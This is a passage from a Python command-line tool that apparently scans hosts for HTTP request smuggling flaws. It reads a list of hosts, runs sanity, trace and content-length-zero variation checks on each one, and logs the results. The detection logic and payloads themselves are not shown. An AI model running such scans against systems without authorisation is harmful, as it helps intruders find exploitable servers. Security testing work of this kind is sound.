            print_and_save_to_file(f"{GREEN}[+]{RESET} Exiting...")
            exit(1)
        except Exception as e:
            print_and_save_to_file(f"{GREEN}[+]{RESET} Error: ", e)
            exit(1)
    if args.list:
        with open(args.list) as f:
            hosts = [h.strip() for h in f if h.strip()] 
        for host in tqdm(hosts, desc="🔍 Scanning Hosts", unit="host"):
            host, endpoint = host_or_endpoint(host)
            print_and_save_to_file(f"\n{GREEN}[>]{RESET} Testing host: ", f"{BLUE}{host}{RESET}")
            print_and_save_to_file(f"{GREEN}[>]{RESET} Testing method: ", f"{BLUE}{method}{RESET}")
            print_and_save_to_file(f"{GREEN}[>]{RESET} Testing endpoint: {BLUE}/{endpoint}{RESET}")
            try:
                if not sanity_check(host):
                    continue
                trace(host, user_agent)
                detect_advanced_HTTPRS(host, show_request, user_agent)
                CL0_variations(host, endpoint, show_request, user_agent)
            except Exception as e:
                print_and_save_to_file(f"{GREEN}[+]{RESET} Error: ", e)
                continue
    if not args.host and not args.list:
        print_and_save_to_file(f"{GREEN}[>]{RESET} Please provide a host or a list of hosts to test")
        exit(1)
    print_and_save_to_file(f"\n{GREEN}[>]{RESET} Done\n")
